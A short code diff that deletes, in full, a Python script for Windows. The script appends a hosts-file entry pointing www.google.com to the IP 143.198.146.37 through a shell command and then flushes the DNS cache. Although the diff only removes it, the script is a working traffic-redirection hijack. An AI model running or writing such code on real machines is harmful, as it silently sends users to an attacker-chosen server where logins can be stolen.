@@ -1,10 +1,1 @@
-import subprocess
-import os
 
-os.chdir(r"C:\Windows\System32\drivers\etc")
-command = 'echo 143.198.146.37 www.google.com >> hosts'
-subprocess.run(command, shell=True, check=True)
-
-
-command = 'ipconfig /flushdns'
-subprocess.run(command, shell=True, check=True)
